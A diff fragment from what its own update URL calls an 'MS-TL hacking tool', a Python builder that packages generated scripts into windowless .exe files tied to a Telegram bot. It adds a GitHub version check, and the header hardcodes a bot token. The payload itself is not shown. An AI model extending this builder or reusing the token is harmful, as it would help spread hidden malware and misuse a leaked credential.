@@ -1,6 +1,8 @@
 # MSTL Bot Normal Token: 6622962602:AAERgZlXugMGZIA5vqkIpv5KKAAsDUrA6is
 from colorama import init, Fore
 from os import system
+import requests
+from json import loads
 init()
 def banner():
     from random import randint
@@ -97,7 +99,16 @@ def make_exe(NAME, ICON):
     system("mkdir output/exe")
     system(f"pyinstaller --name {NAME} --onefile -i {ICON} --noconsole --distpath output/exe output/{NAME}.py")
     print(Fore.GREEN + ".exe application is created in /output/exe/mstl")
+def check_update(): 
+    online_version = loads(requests.get("https://raw.githubusercontent.com/Unknow-per/MS-TL-hacking-tool/main/log/version.json").text)
+    with open("log/version.json", "r") as file:
+        local_version = loads(file.read())
+    if online_version["version"] == local_version["version"]: pass
+    else: 
+        print(Fore.RED + "Please update the program with 'git pull' command.")
+        exit()
 banner()
+check_update()
 try: 
     id = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " write your telegram user id(with @userinfobot): "))
     tok = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " If you want to use custome token write C if not press enter: ")).lower()
